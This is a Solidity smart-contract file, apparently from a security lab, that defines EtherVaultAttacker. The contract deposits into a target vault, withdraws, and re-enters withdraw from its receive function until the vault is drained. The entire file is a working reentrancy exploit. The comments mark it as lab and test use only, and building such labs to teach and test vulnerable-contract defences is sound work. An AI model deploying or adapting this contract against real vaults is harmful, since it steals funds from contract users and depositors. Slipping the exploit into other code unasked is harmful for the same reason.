// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEtherVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title EtherVaultAttacker
/// @notice Reentrancy attacker used by the lab tests and scripts.
/// @dev LAB USE ONLY. The contract deposits a small amount, withdraws it, and
///      re-enters `withdraw` from `receive` while the vault balance is stale.
contract EtherVaultAttacker {
    IEtherVault public immutable vault;
    uint256 public depositAmount;

    constructor(address vaultAddress) {
        require(vaultAddress != address(0), "EtherVaultAttacker: zero vault");
        vault = IEtherVault(vaultAddress);
    }

    /// @notice Start the attack with the deposit amount.
    function attack() external payable {
        require(msg.value > 0, "EtherVaultAttacker: zero deposit");
        depositAmount = msg.value;
        vault.deposit{ value: msg.value }();
        vault.withdraw();
    }

    /// @notice Re-enter the vault as long as it still holds at least one unit.
    receive() external payable {
        if (address(vault).balance >= depositAmount) {
            vault.withdraw();
        }
    }
}
